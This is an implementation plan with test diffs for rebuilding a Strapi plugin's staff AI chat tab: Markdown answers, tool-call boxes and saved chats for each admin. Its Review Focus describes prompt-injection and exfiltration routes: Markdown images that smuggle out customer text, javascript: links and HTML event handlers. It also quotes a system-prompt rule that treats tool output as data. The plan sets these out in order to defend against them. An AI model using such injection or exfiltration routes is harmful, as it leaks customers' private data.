# Maison Ask tab rebuild Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Rebuild the Ask tab so it looks and works like the chat in Paul's strapi-plugin-tanstack-ai 1.6.0: a chat area that fills the page, a top bar with History, Tools and the model, bubbles with Markdown answers, a box for every tool call, a composer with Send and Stop, and saved chats for each admin. Every rule Maison's chat already has stays.

**Architecture:** The pieces of the screen are small components in `admin/src/components/assistant/`, copied from the reference with the changes the spec names, and each reads plain props, so a test renders it with Testing Library and jsdom. The rules stay pure functions in `admin/src/assistant.ts` and `admin/src/conversations.ts` under unit test. `AssistantProvider` still owns `useChat`, and now also the saved chats: it saves the open chat after each turn through one queue, switches chats with `setMessages`, and keeps the sidebar's state. On the server, the status answer lists the tools the admin's chat really gets, and a new `conversations` service, controller and five routes keep each admin's chats in a hidden content type.

**Tech Stack:** Strapi 5.55.1 plugin (CommonJS server, React 18.3.1 admin, design system 2.2.4, styled-components 6.5.3, zod 4 from `@strapi/utils`), TanStack AI 0.52.3 (`@tanstack/ai-react` 0.22.4, `@tanstack/ai-client` 0.29.2), react-markdown 9 with remark-gfm 4, Vitest 3 with jsdom 25 and Testing Library 16, node:test integration suites.

**Spec:** /Users/paul/work/maison-demo/docs/superpowers/specs/2026-10-06-maison-staff-chat-design.md, the section "The Ask tab rebuild (7 October 2026)" (commit f0a47ce), with sections 1, 3 and 5 for the rules that stay. Where an earlier section disagrees with the rebuild section, the rebuild section wins. The reference to copy is strapi-plugin-tanstack-ai 1.6.0 at /Users/paul/learning/tanstack-ai/strapi-plugin-tanstack-ai, and its verified map is /Users/paul/work/maison-demo/.superpowers/sdd/2026-10-06-maison-staff-chat/reference-chat-ui-map.md (below, "the map" and "R/").

**Where this plan stops:** Tasks 1 to 10 of the first plan are built. This plan is the rebuild: Step 1b (Tasks 1 to 5, the screen) and Step 1c (Tasks 6 to 8, saved chats and docs). "Ask about this", the draft cards, Use this draft and the dialog changes (the first plan's Tasks 11 to 16) come after it, built on these components. The suite goes from 94 files and 2819 tests to 113 files and 3224 tests.

## Global Constraints

- **Branch:** `feat/maison-staff-chat` in `/Users/paul/work/maison-demo` (HEAD f0a47ce when this plan was written), already checked out. Never push. Nothing reaches `main` or production before Paul approves it. Leave the untracked `.vscode/`, `liff/AGENTS.md` and `liff/CLAUDE.md` alone. Paul's Strapi may be running on port 1338 from this checkout: leave it alone, and use no port.
- **Paths** are relative to `strapi/src/plugins/maison/` (the plugin) unless they start with `strapi/`, which are relative to the repo root. Every command runs in the plugin folder, except `git`, which runs at the repo root, `/Users/paul/work/maison-demo`, with repo-root paths (`strapi/src/plugins/maison/…`).
- **The spec's rebuild section decides.** These earlier lines are replaced: "No saved history" (section 1 and Paul's answer 5), "Messages are plain text, no Markdown", "Tool lines" as one line of text, and the instruction "Reply in short plain text, with no Markdown." Everything in the rebuild section's "What stays" stays, with its tests.
- **Copy the reference closely.** The markup and styles of the chat in strapi-plugin-tanstack-ai 1.6.0 (R/ is `/Users/paul/learning/tanstack-ai/strapi-plugin-tanstack-ai`, admin code under `admin/src`), with the changes the spec and the map's sections 3.3, 3.4 and 4 call for. Read the reference file named in each task before you write its component. Every colour is a theme token (`theme.colors.*`, `theme.shadows.*`), never a literal. R/ is not installed in the demo: nothing imports it.
- **Model calls go only through TanStack AI,** never a raw fetch: `chat()` on the server, `useChat` in the page. The server builds the adapter with `createAnthropicChat(model, apiKey)`, never `anthropicText()`. `server/src/assistant/sdk.ts` is the only file in `server/src` that names `@tanstack/*`.
- **No component imports server code.** The admin bundle and the server bundle are separate. A unit test may import both sides to tie a repeated text or number to the server's.
- **Nothing writes.** The chat never sends, confirms, answers, closes or relabels. The only thing it writes is the admin's own saved chats.
- **Packages.** `dependencies` hold the four TanStack AI packages at exact versions (`@tanstack/ai` 0.52.3, `@tanstack/ai-anthropic` 0.18.3, `@tanstack/ai-react` 0.22.4, `@tanstack/ai-client` 0.29.2), and gain `react-markdown` `^9.1.0` and `remark-gfm` `^4.0.1`. `devDependencies` gain `jsdom` `^25.0.1`, `@testing-library/react` `^16.3.2` and `@testing-library/user-event` `^14.6.1`. After any `npm install` in the plugin, run `node ../../../scripts/share-strapi-utils.mjs` (npm puts back the plugin's own copy of `@strapi/utils`, which must be the app's), then `node ../../../scripts/share-strapi-utils.mjs --check`, and `npm ls @tanstack/ai` shows one copy.
- **Maison's rules that stay,** each held by a pure helper in `admin/src/assistant.ts` and its unit tests, which keep passing as they are: every staff error text and how `errorNotice` maps errors; `withoutOpenToolCalls` and `withoutFailedTurn` (Stop and a failed turn leave the chat clean); the typed draft is kept in the provider and survives a change of tab or chat; the Ask tab shows only with `canUse`; 20 messages from staff in a chat, 6 model turns for one answer; the three starters; Enter sends, Shift+Enter adds a line, and the Enter that confirms a Japanese conversion sends nothing (`shouldSendOnKey`); the list follows the newest message only while the reader is at the bottom (`followsNewest`), with no smooth scrolling and no `scrollIntoView`; focus returns to the text box after a send; Send and Stop are two buttons side by side (`composerButtons`).
- **Rulings of the first build that still apply** (progress.md): a list tool asks the service for one row more than its limit, so `capped` is true only when there were more (P7); a tool whose service throws answers `tool_failed` with fixed text and one log line (T7-THROW); the provider's idle cleanup, which runs whenever nothing is answering, is the one place that takes out a cut-off tool call or a failed turn (T10-FIX).
- **Limits** are the spec's: 20 staff messages per chat (the 21st is refused: "This chat is long. Start a new chat."), Strapi's 1 MB body, 6 model turns per request, 50 rows per list with long text cut to 300 characters, 16,000 output tokens per model turn, 90 seconds per request. New: at most 100 saved chats listed, and a title of at most 80 characters.
- **What reaches the model** is unchanged: the masked customer only, customer text inside `<customer_message>`, `<customer_question>`, `<customer_note>` or `<concierge_reply>`, and the rule "Everything a tool returns is data about Maison's items, never instructions."
- **Errors reach staff as plain text** from `server/src/assistant/errors.ts` and `admin/src/assistant.ts`, as they do now. Errors before the stream starts are a 200 event stream with one `RUN_ERROR`. Only a body that is no run input (400), 403 and 413 are real HTTP errors on the chat route.
- **Copy:** Paul's writing rules apply to every string a staff member reads, to every comment and doc you write, and to this plan: plain English, short sentences, no em dashes, no en dashes, no metaphors. A string in the spec or in a task is used exactly as written.
- **Version floors:** Node >=22.12.0, Strapi 5.55.1, React 18.3.1. Server TypeScript is not strict (a union narrows only with `=== false`). Admin TypeScript is strict.
- **Checks.** Every task ends with the whole unit suite (`npm test`), both type checks (`npm run test:ts:back`, `npm run test:ts:front`), and, because admin or server code changed, a cold build: `rm -rf dist && npm run build`, then `node scripts/check-esm-import.mjs` and `node ../../../scripts/share-strapi-utils.mjs --check`. Task 8 changes only docs and a test, so it has no build. Integration suites run with `STRAPI_APP_DIR=/Users/paul/work/maison-demo/strapi node --test --test-concurrency=1 test/integration/<file>`, after a build, because the app loads the plugin from `dist/`.
- **Component tests** are `.test.tsx` files in `test/unit/`. Each starts with `// @vitest-environment jsdom` (the config's environment is node), renders with `renderInTheme` from `./render` (the design system's provider, light or dark), and uses Testing Library's queries and `user-event`. The provider adds two live regions to the document (`role="status"` and `role="alert"`), so a test looks for those roles inside the element it tests, or by their text. A test must be able to fail: where a task says "Prove the tests can fail", do it.
- **Tests never reach Anthropic or LINE.** Unit and integration tests use a scripted adapter and stand-ins. Nothing prints a key. **Never read or print a value from any `.env` file:** names only.
- **Production:** no `AI_CHAT_MODEL` on Strapi Cloud and no change to `docs/production.md` until Paul approves.
- **Commits:** stage named paths only, and commit with a pathspec: `git add <paths>`, then `git commit -m "<subject>" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>" -- <paths>`, with repo-root paths. Subjects start with `maison:` (code) or `docs:` (docs). Every message ends with that trailer.
- **Browser checks are Paul's.** A step marked "(Paul)" is skipped by the implementer, who says so in the report. Task 8 holds Paul's checklist.
- **Diffs** in the steps have no line numbers: match the context lines. If a line differs from the diff, the diff's quoted text is what to match, and the file on the branch is what to keep.

## Review Focus

The five input classes or failure modes the spec implies that no single task's own tests would be enough for, most likely to go wrong first. Each line names the task that owns the code, and that task has the test.

1. **An answer or a tool result carries hostile text:** a Markdown image whose address holds other customers' words, a link to `javascript:`, `data:` or `mailto:`, raw HTML with an event handler, or customer-text tags in a tool result. Expected: no image is requested or left behind, the link shows as plain text, the HTML shows as text, and an opened tool box shows the result with the tags taken out and the customers still masked. (Task 2 tests `safeLink` and `withoutCustomerTags`, Task 4 tests `MarkdownBody` and `ToolBox`.)
2. **Another admin's chat, or a chat that is gone:** an admin opens, saves or deletes a chat by an ID that belongs to someone else, or one that was deleted meanwhile (another tab, or Reset demo activity). Expected: `404` with the same words as for an ID nobody has, nothing read or changed, only the admin's own chats listed, and a chat that vanished is saved again as a new chat after the next turn, with no error. (Task 6 tests the service, the controller and a real Strapi; Task 7 tests the 404 fallback in the save queue and in the tab.)
3. **A save is still on its way when staff stop an answer, press New chat, open another chat, or delete a chat:** expected: the saved chat holds only cleaned messages (reopened, it never shows a box that spins), one chat is created once however many saves overlap, a save goes to the chat it was made for, a delete waits for the saves before it, and nothing is lost or listed twice. (Task 7 tests the queue and the tab.)
4. **A saved chat that cannot be read, and one with thinking signatures:** a stored value in a shape this version does not know, or a chat with signed thinking parts. Expected: the unreadable one opens as an empty chat (the log names it, and the stored value is left alone), and a good one comes back with every key of every part as saved, so Anthropic accepts the history. (Task 6 tests the stored-body check, the service and a real Strapi; Task 7 tests an empty saved chat in the tab.)
5. **Japanese, long and wide content:** Japanese typed with a conversion, a long message, a table wider than the bubble, an unbroken word, and a title of Japanese text or emoji. Expected: the Enter that confirms a conversion sends nothing, the box grows to six lines and then scrolls, a wide table scrolls inside its bubble and never widens the chat, a long word wraps, and a title is cut at 80 characters without splitting a character. (Task 5 tests the composer, Task 4 the message list and Markdown, Task 6 and 7 the title.)

## File Structure

| File | Task | Responsibility |
| --- | --- | --- |
| `package.json`, `package-lock.json`, `vitest.config.ts` (modify) | 1 | The five new packages, and a config that runs `.test.tsx` files with the automatic JSX runtime and the design system's ES entries |
| `test/unit/render.tsx` (create) | 1 | `renderInTheme`: the design system's provider in the light or dark theme, with Testing Library's clean-up |
| `test/unit/component-toolchain.test.tsx` (create) | 1 | Holds the toolchain: the design system, user events, react-markdown and remark-gfm under jsdom |
| `server/src/assistant/tools.ts` (modify) | 1 | `TOOL_LABELS` and `toolLabel`: what staff call each tool |
| `server/src/services/assistant.ts`, `server/src/controllers/assistant.ts` (modify) | 1 | `statusFor(ability)`: the status with the tools this admin's chat gets |
| `server/src/assistant/instructions.ts` (modify) | 1 | The Markdown lines replace "Reply in short plain text, with no Markdown." |
| `admin/src/assistant.ts` (modify) | 1, 2 | `ToolInfo` and the status with tools; then the tool box model, tag removal, safe links, tool notes and the "Working on it…" rule |
| `admin/src/tabs.ts`, `admin/src/pages/MaisonPage.tsx` (modify) | 3 | `fillsPage` and `showsDemoData`, and a page that fills the height while Ask is open |
| `admin/src/components/assistant/TopBarIcon.tsx` (create) | 3 | The 32px top-bar button with its tooltip, and the History, Tools and New chat icons |
| `admin/src/components/assistant/ChatFrame.tsx` (create) | 3 | The chat area, the chat column, the top bar and its spacer, as styled components |
| `admin/src/components/assistant/ModelBadge.tsx`, `ToolsPopover.tsx`, `EmptyState.tsx` (create) | 3 | The model badge, the read-only list of tools, and the empty state with the three starters |
| `admin/src/components/assistant/ChatArea.tsx` (create, modify in 7) | 3, 7 | The chat area with its top bar, around what it is given; in Task 7 the sidebar and the History button |
| `admin/src/components/assistant/AskTab.tsx` (modify) | 3, 4, 5, 7 | The tab: its states, and the chat area filled with the messages, the error box and the composer |
| `admin/src/components/assistant/MarkdownBody.tsx`, `ToolBox.tsx`, `MessageList.tsx` (create) | 4 | An answer as Markdown, one tool call as a box, and the messages with their bubbles, the dots and the scrolling |
| `admin/src/components/assistant/ChatMessages.tsx`, `ToolLine.tsx` (delete) | 4 | Replaced by `MessageList` and `ToolBox` |
| `admin/src/components/assistant/Composer.tsx`, `ErrorBox.tsx`, `SetupNotice.tsx` (create) | 5 | The text box row with Send and Stop, the red box and the grey note, and the notice for a set-up problem |
| `server/src/constants.ts`, `server/src/content-types/conversation/*`, `server/src/content-types/index.ts` (modify, create) | 6 | `UID.conversation`, `SAVED_CHATS`, and the hidden content type `plugin::maison.conversation` |
| `server/src/assistant/stored-messages.ts` (create) | 6 | The `{ v: 1, messages }` check, with every key of every part kept |
| `server/src/services/conversations.ts`, `server/src/controllers/conversations.ts` (create), `server/src/services/index.ts`, `server/src/controllers/index.ts`, `server/src/routes/index.ts` (modify) | 6 | The saved chats: the owner check, the five handlers, the five routes |
| `server/src/services/seed.ts` (modify) | 6 | Reset demo activity deletes every saved chat |
| `admin/src/conversations.ts` (create) | 7 | Paths, answer checks, title, list changes, `needsSaving` and the save queue |
| `admin/src/components/assistant/ConversationSidebar.tsx` (create) | 7 | The history sidebar |
| `admin/src/components/assistant/AssistantProvider.tsx` (modify) | 7 | Saving after each turn, opening, deleting and starting chats, and the sidebar's state |
| `README.md`, `CHANGELOG.md` (modify) | 8 | The Ask tab, `AI_CHAT_MODEL`, the new routes and packages |
| `test/unit/*.test.ts(x)` (create, modify) | 1 to 8 | One file per helper or component, named in each task |
| `test/unit/fake-conversations.ts` (create) | 6 | The Document Service as a table for the saved chats, and a Koa context |
| `test/integration/assistant-conversations.test.mjs` (create) | 6 | The saved chats on a real Strapi |

---

### Task 1: The status answer's tools, the Markdown instructions, the packages and the component test toolchain

**Group:** Step 1b. Four things the later tasks use. Nothing on the screen changes yet.

Read first: the spec's rebuild section ("Server changes", "Tests"); `server/src/services/assistant.ts` (`status`), `server/src/controllers/assistant.ts` (`status`), `server/src/assistant/tools.ts` (`assistantTools`, `READ_TOOL_NAMES`), `server/src/assistant/instructions.ts`, `admin/src/assistant.ts` (`AssistantStatus`, `isStatus`, `askTabState`), `test/unit/assistant-controller.test.ts`, `test/unit/assistant-dependencies.test.ts`, `vitest.config.ts`.

**Files:**
- Modify: `server/src/assistant/tools.ts`, `server/src/services/assistant.ts`, `server/src/controllers/assistant.ts`, `server/src/assistant/instructions.ts`, `admin/src/assistant.ts`, `package.json`, `package-lock.json`, `vitest.config.ts`
- Create: `test/unit/render.tsx`, `test/unit/component-toolchain.test.tsx`
- Test (modify): `test/unit/assistant-tools.test.ts`, `test/unit/assistant-controller.test.ts`, `test/unit/assistant-stream.test.ts`, `test/unit/assistant-instructions.test.ts`, `test/unit/assistant-admin.test.ts`, `test/unit/assistant-dependencies.test.ts`

**Interfaces:**
- Consumes (built): `assistantTools(strapi, ability): AssistantToolSpec[]`, `READ_TOOL_NAMES` and `Ability { can(action: string): boolean }` from `server/src/assistant/tools.ts`; the service's `status()`, which stays as it is (the chat route still uses it); the admin's `AssistantStatus`, `isStatus`, `AskTabState` and `askTabState`.
- Produces:
  ```ts
  // server/src/assistant/tools.ts
  export const TOOL_LABELS: Record<string, string>;     // list_requests 'Visit requests', list_questions 'Customer questions', list_inquiries 'Inquiries', inquiry_counts 'Inquiry counts', search_knowledge 'Product knowledge', search_products 'Product search', view_product 'Product details'
  export const toolLabel: (name: string) => string;      // the label, or the name itself for a tool with none
  // server/src/services/assistant.ts
  export interface ToolInfo { name: string; label: string }
  export type AssistantStatusAnswer = { ready: true; model: string; tools: ToolInfo[] } | { ready: false; reason: string };
  // the service gains: statusFor(ability: Ability): AssistantStatusAnswer
  // GET /maison/assistant/status now answers statusFor(ctx.state.userAbility ?? { can: () => false })
  // admin/src/assistant.ts
  export interface ToolInfo { name: string; label: string }
  export type AssistantStatus = { ready: true; model: string; tools: ToolInfo[] } | { ready: false; reason: string };
  export type AskTabState =
    | { kind: 'loading' }
    | { kind: 'failed'; text: string }
    | { kind: 'not-ready'; text: string }
    | { kind: 'chat'; model: string; tools: ToolInfo[] };   // isStatus needs tools: an array of { name, label } strings
  // test/unit/render.tsx
  export const renderInTheme: (ui: ReactElement, options?: { dark?: boolean }) => RenderResult;   // its rerender keeps the provider
  ```
- Decisions made here: the tools list is built from `assistantTools(strapi, ability)`, so it is what this admin's chat really gets after the permissions and `disabledTools`, never `READ_TOOL_NAMES`. The status carries `{ name, label }` only. The one line of text for staff under each tool is written in Task 2, in the admin, because the spec's status answer has no field for it. `jsdom` is `^25.0.1`, the version `strapi-plugin-ai-chat` already runs with this Vitest.

**Review Focus covered here:** an admin who may use the assistant but holds no read permission (and `disabledTools`): the status lists no tool, or only the allowed ones, and the Tools button says so (Task 3 draws it). Pinned by `assistant.status > lists the tools this admin's chat really gets: only what their role allows` and the two tests after it in `assistant-controller.test.ts`, and by `statusFor > lists the same tools a turn offers the model: the admin's permissions and disabledTools both count` in `assistant-stream.test.ts`.

- [ ] **Step 1: Write the failing tests for the status answer, the labels and the instructions**

`test/unit/assistant-tools.test.ts` holds the labels. `test/unit/assistant-controller.test.ts` and `test/unit/assistant-stream.test.ts` hold the status answer, over the real service with a fake Strapi. `test/unit/assistant-instructions.test.ts` holds the Markdown lines: the old test that asks for "short plain text with no Markdown" is replaced.

`test/unit/assistant-tools.test.ts`:

```diff
@@
 import { describe, expect, it, vi } from 'vitest';
 import { ACTION, ASSISTANT_LIMITS, INQUIRY_FILTERS, INQUIRY_KINDS } from '../../server/src/constants';
-import { READ_TOOL_NAMES, assistantTools, type AssistantToolSpec } from '../../server/src/assistant/tools';
+import { READ_TOOL_NAMES, TOOL_LABELS, assistantTools, toolLabel, type AssistantToolSpec } from '../../server/src/assistant/tools';
 import { DATA_RULE } from '../../server/src/assistant/views';
 import { fakeStrapi } from './fake-strapi';
 
@@
     expect(searchKnowledge).not.toHaveBeenCalled();
   });
 });
+
+describe('the tool labels', () => {
+  it('are the labels the spec gives each read tool, as staff read them in the list of tools', () => {
+    expect(TOOL_LABELS).toEqual({
+      list_requests: 'Visit requests',
+      list_questions: 'Customer questions',
+      list_inquiries: 'Inquiries',
+      inquiry_counts: 'Inquiry counts',
+      search_knowledge: 'Product knowledge',
+      search_products: 'Product search',
+      view_product: 'Product details',
+    });
+  });
+
+  // A tool added later must come with a label. This reads the tools an admin who can do everything is offered, not the list above.
+  it('cover every tool an admin who may do everything is offered, so a new tool cannot arrive without one', () => {
+    const everything = { can: () => true };
+    for (const { name } of assistantTools(fakeStrapi(), everything)) expect(Object.keys(TOOL_LABELS), name).toContain(name);
+  });
+
+  it('give each tool a label of its own, in plain words: no tool name, no dash', () => {
+    const labels = Object.values(TOOL_LABELS);
+    expect(new Set(labels).size).toBe(labels.length);
+    for (const label of labels) expect(label).not.toMatch(/_|\u2014|\u2013/);
+  });
+
+  it('fall back to the tool name for a tool with no label, and never to something every object has', () => {
+    expect(toolLabel('list_requests')).toBe('Visit requests');
+    expect(toolLabel('something_new')).toBe('something_new');
+    for (const name of ['toString', '__proto__', 'constructor']) expect(toolLabel(name), name).toBe(name);
+  });
+});
```

`test/unit/assistant-controller.test.ts`:

```diff
@@
     .filter((block) => block.startsWith('data: '))
     .map((block) => JSON.parse(block.slice('data: '.length)));
 
+/** The seven read tools with the labels staff read, in the order the chat offers them. */
+const ALL_TOOLS = [
+  { name: 'list_requests', label: 'Visit requests' },
+  { name: 'list_questions', label: 'Customer questions' },
+  { name: 'list_inquiries', label: 'Inquiries' },
+  { name: 'inquiry_counts', label: 'Inquiry counts' },
+  { name: 'search_knowledge', label: 'Product knowledge' },
+  { name: 'search_products', label: 'Product search' },
+  { name: 'view_product', label: 'Product details' },
+];
+/** A Koa context whose admin may do only these actions. */
+const ctxFor = (...granted: string[]) => fakeCtx({ state: { userAbility: { can: (action: string) => granted.includes(action) }, user: { id: 7 } } });
+
 describe('assistant.status', () => {
-  it('answers ready with the model, for an admin when there is a key and the provider is anthropic', async () => {
+  it('answers ready with the model and the tools, for an admin when there is a key and the provider is anthropic', async () => {
     const ctx = fakeCtx();
     await world().controller.status(ctx);
-    expect(ctx.body).toEqual({ ready: true, model: 'claude-sonnet-5-5' });
+    expect(ctx.body).toEqual({ ready: true, model: 'claude-sonnet-5-5', tools: ALL_TOOLS });
+  });
+
+  it("lists the tools this admin's chat really gets: only what their role allows", async () => {
+    const inquiries = ctxFor(ACTION.inquiriesView);
+    await world().controller.status(inquiries);
+    expect(inquiries.body.tools).toEqual([
+      { name: 'list_inquiries', label: 'Inquiries' },
+      { name: 'inquiry_counts', label: 'Inquiry counts' },
+    ]);
+
+    const nothing = ctxFor(ACTION.assistantUse);
+    await world().controller.status(nothing);
+    expect(nothing.body).toEqual({ ready: true, model: 'claude-sonnet-5-5', tools: [] });
+  });
+
+  it('leaves out the catalog tools that disabledTools names, as the chat does: the list is never every tool the plugin has', async () => {
+    const ctx = fakeCtx();
+    await world({ config: { disabledTools: ['search_products', 'view_product'] } }).controller.status(ctx);
+    expect(ctx.body.tools.map((tool: Doc) => tool.name)).toEqual(['list_requests', 'list_questions', 'list_inquiries', 'inquiry_counts', 'search_knowledge']);
+  });
+
+  it('lists no tools when the context has no ability at all', async () => {
+    const ctx = fakeCtx({ state: { user: { id: 7 } } });
+    await world().controller.status(ctx);
+    expect(ctx.body).toEqual({ ready: true, model: 'claude-sonnet-5-5', tools: [] });
   });
 
   it('answers not ready with the reason, for no key and for another provider', async () => {
```

`test/unit/assistant-stream.test.ts`:

```diff
@@
 
   it('is not labelling: the labelling model does not change the chat model', () => {
     expect(setup({ config: { aiModel: 'claude-haiku-4-5-20251001' } }).service.status()).toEqual({ ready: true, model: 'claude-sonnet-5-5' });
+  });
+});
+
+describe('statusFor', () => {
+  const toolsOf = (answer: Doc) => (answer.tools as Doc[]).map((tool) => tool.name);
+
+  it('is the status with the tools the admin gets, each with its name and the label staff read', () => {
+    const answer = setup().service.statusFor(everything);
+    expect(answer).toMatchObject({ ready: true, model: 'claude-sonnet-5-5' });
+    expect(toolsOf(answer)).toEqual([...READ_TOOL_NAMES]);
+    expect((answer as Doc).tools[0]).toEqual({ name: 'list_requests', label: 'Visit requests' });
+  });
+
+  it('lists the same tools a turn offers the model: the admin\'s permissions and disabledTools both count', () => {
+    const only = { can: (action: string) => action === ACTION.catalogRead || action === ACTION.questionsRead };
+    const world = setup({ config: { disabledTools: ['view_product'] } });
+    expect(toolsOf(world.service.statusFor(only))).toEqual(['list_questions', 'search_knowledge', 'search_products']);
+    expect(toolsOf(world.service.statusFor(only))).toEqual(world.service.tools(only).map((tool) => tool.name));
+    expect(toolsOf(world.service.statusFor(nothing))).toEqual([]);
+  });
+
+  it('is the not-ready status, with no tools, when the assistant is not ready', () => {
+    expect(setup({ config: { aiApiKey: null } }).service.statusFor(everything)).toEqual({ ready: false, reason: NO_KEY });
+    expect(setup({ config: { aiProvider: 'openai' } }).service.statusFor(everything)).not.toHaveProperty('tools');
+  });
+
+  it('never carries the key', () => {
+    for (const config of [{}, { aiApiKey: null }, { aiProvider: 'openai' }]) expect(JSON.stringify(setup({ config }).service.statusFor(everything))).not.toContain(KEY);
   });
 });
 
```

`test/unit/assistant-instructions.test.ts`:

```diff
@@
     expect(prompt).toContain("Staff do that with the buttons on this page.");
   });
 
-  it('answers in short plain text with no Markdown, in the language staff write in', () => {
-    const prompt = text();
-    expect(prompt).toContain('Reply in short plain text, with no Markdown.');
-    expect(prompt).toContain('Reply in the language staff write in.');
+  // The Ask tab draws the answers as Markdown, tables included, and never draws an image.
+  it('answers in Markdown, with a table for items that have the same fields and short text otherwise, and never an image', () => {
+    const prompt = text();
+    expect(prompt).toContain('Write in Markdown.');
+    expect(prompt).toContain('When you list several items with the same fields, such as reference, customer, status and date, use a table.');
+    expect(prompt).toContain('Otherwise use short paragraphs or a short list.');
+    expect(prompt).toContain('Keep answers short.');
+    expect(prompt).toContain('Never include images.');
+  });
+
+  it('no longer asks for plain text with no Markdown', () => {
+    const prompt = text();
+    expect(prompt).not.toContain('plain text');
+    expect(prompt).not.toContain('no Markdown');
+  });
+
+  it('answers in the language staff write in', () => {
+    expect(text()).toContain('Reply in the language staff write in.');
   });
 
   it('uses only what the tools return and what staff say, and says so when it does not know', () => {
```

- [ ] **Step 2: Write the failing tests for the admin status and the packages**

`test/unit/assistant-admin.test.ts`: `isStatus` needs the tools, and `askTabState` carries them. `test/unit/assistant-dependencies.test.ts`: the five new packages and their ranges.

`test/unit/assistant-admin.test.ts`:

```diff
@@
 });
 
 describe('isStatus', () => {
+  const TOOLS = [
+    { name: 'list_requests', label: 'Visit requests' },
+    { name: 'inquiry_counts', label: 'Inquiry counts' },
+  ];
+
   it.each([
-    [{ ready: true, model: 'claude-sonnet-5-5' }, true],
+    [{ ready: true, model: 'claude-sonnet-5-5', tools: TOOLS }, true],
+    [{ ready: true, model: 'claude-sonnet-5-5', tools: [] }, true],
     [{ ready: false, reason: 'The assistant works with Anthropic only. AI_PROVIDER is set to openai.' }, true],
+    // A ready status lists the tools: the tab's list of tools is built from it.
+    [{ ready: true, model: 'claude-sonnet-5-5' }, false],
+    [{ ready: true, model: 'claude-sonnet-5-5', tools: 'list_requests' }, false],
+    [{ ready: true, model: 'claude-sonnet-5-5', tools: ['list_requests'] }, false],
+    [{ ready: true, model: 'claude-sonnet-5-5', tools: [{ name: 'list_requests' }] }, false],
+    [{ ready: true, model: 'claude-sonnet-5-5', tools: [{ name: 5, label: 'x' }] }, false],
+    [{ ready: true, model: 'claude-sonnet-5-5', tools: [null] }, false],
+    [{ ready: true, tools: TOOLS }, false],
     [{ ready: true }, false],
-    [{ ready: true, model: 5 }, false],
+    [{ ready: true, model: 5, tools: TOOLS }, false],
     [{ ready: false }, false],
     [{ ready: false, reason: 5 }, false],
-    [{ ready: 'yes', model: 'm' }, false],
-    [{ model: 'm' }, false],
+    [{ ready: 'yes', model: 'm', tools: [] }, false],
+    [{ model: 'm', tools: [] }, false],
     [{}, false],
     [null, false],
     [undefined, false],
@@
     });
   });
 
-  it('is the chat, with the model, when the assistant is ready', () => {
-    expect(askTabState({ ready: true, model: 'claude-sonnet-5-5' }, null)).toEqual({ kind: 'chat', model: 'claude-sonnet-5-5' });
+  it('is the chat, with the model and the tools, when the assistant is ready', () => {
+    const tools = [{ name: 'list_requests', label: 'Visit requests' }];
+    expect(askTabState({ ready: true, model: 'claude-sonnet-5-5', tools }, null)).toEqual({ kind: 'chat', model: 'claude-sonnet-5-5', tools });
   });
 
   it('keeps showing a status it has when a later check failed', () => {
-    expect(askTabState({ ready: true, model: 'claude-sonnet-5-5' }, 'Failed to fetch')).toEqual({ kind: 'chat', model: 'claude-sonnet-5-5' });
+    expect(askTabState({ ready: true, model: 'claude-sonnet-5-5', tools: [] }, 'Failed to fetch')).toEqual({ kind: 'chat', model: 'claude-sonnet-5-5', tools: [] });
   });
 });
 
```

`test/unit/assistant-dependencies.test.ts`:

```diff
@@
 import { readFileSync } from 'node:fs';
 import { describe, expect, it } from 'vitest';
 
-const manifest = JSON.parse(readFileSync(new URL('../../package.json', import.meta.url), 'utf8')) as { dependencies: Record<string, string> };
+const manifest = JSON.parse(readFileSync(new URL('../../package.json', import.meta.url), 'utf8')) as {
+  dependencies: Record<string, string>;
+  devDependencies: Record<string, string>;
+};
 
 /** The TanStack AI set the spec was checked against. Exact: a range lets npm put two copies of the SDK side by side. */
 const PINNED = {
@@
     for (const [name, version] of tanstack) expect(version, name).toMatch(/^\d+\.\d+\.\d+$/);
   });
 });
+
+/** The Markdown renderer the Ask tab draws answers with. They are in `dependencies`, as strapi-plugin-tanstack-ai 1.6.0 has them. */
+describe('the Markdown packages', () => {
+  it.each([
+    ['react-markdown', '^9.1.0'],
+    ['remark-gfm', '^4.0.1'],
+  ])('declare %s %s in dependencies', (name, range) => {
+    expect(manifest.dependencies[name]).toBe(range);
+  });
+});
+
+/** What the component tests run on. They are only for the tests, so they are in `devDependencies` and never ship with the plugin. */
+describe('the component test packages', () => {
+  it.each([
+    ['jsdom', '^25.0.1'],
+    ['@testing-library/react', '^16.3.2'],
+    ['@testing-library/user-event', '^14.6.1'],
+  ])('declare %s %s in devDependencies, and not in dependencies', (name, range) => {
+    expect(manifest.devDependencies[name]).toBe(range);
+    expect(manifest.dependencies[name]).toBeUndefined();
+  });
+});
```

- [ ] **Step 3: Write the toolchain test and its helper**

The component tests of the later tasks use this: the design system inside its provider, user events, and react-markdown with remark-gfm, all under jsdom. If the install or the config is wrong, this file fails with a name that says so, and not in the middle of a component's own test. `renderInTheme` registers Testing Library's clean-up itself, because Vitest has no globals here. The provider adds two live regions to the document, so a test that looks for `role="status"` or `role="alert"` looks inside the element it tests.

Create `test/unit/render.tsx`:

```tsx
import { DesignSystemProvider, darkTheme, lightTheme } from '@strapi/design-system';
import { cleanup, render } from '@testing-library/react';
import type { ReactElement } from 'react';
import { afterEach } from 'vitest';

// Vitest has no globals here, so Testing Library can't register its own clean-up: without it each render stays in the document.
afterEach(cleanup);

/**
 * Renders `ui` inside the design system's provider, in the light theme or the dark one, as the Strapi admin shows it. `rerender` keeps the
 * provider around what it is given, which Testing Library's own does not. The provider adds two live regions of its own to the document
 * (`role="status"` and `role="alert"`), so a test that looks for one of those roles looks inside the element it tests, or by name.
 */
export const renderInTheme = (ui: ReactElement, { dark = false }: { dark?: boolean } = {}) => {
  const inProvider = (node: ReactElement) => (
    <DesignSystemProvider locale="en" theme={dark ? darkTheme : lightTheme}>
      {node}
    </DesignSystemProvider>
  );
  const view = render(inProvider(ui));
  return { ...view, rerender: (next: ReactElement) => view.rerender(inProvider(next)) };
};
```

Create `test/unit/component-toolchain.test.tsx`:

```tsx
// @vitest-environment jsdom
import { Button } from '@strapi/design-system';
import { screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { useTheme } from 'styled-components';
import { describe, expect, it, vi } from 'vitest';
import { renderInTheme } from './render';

/**
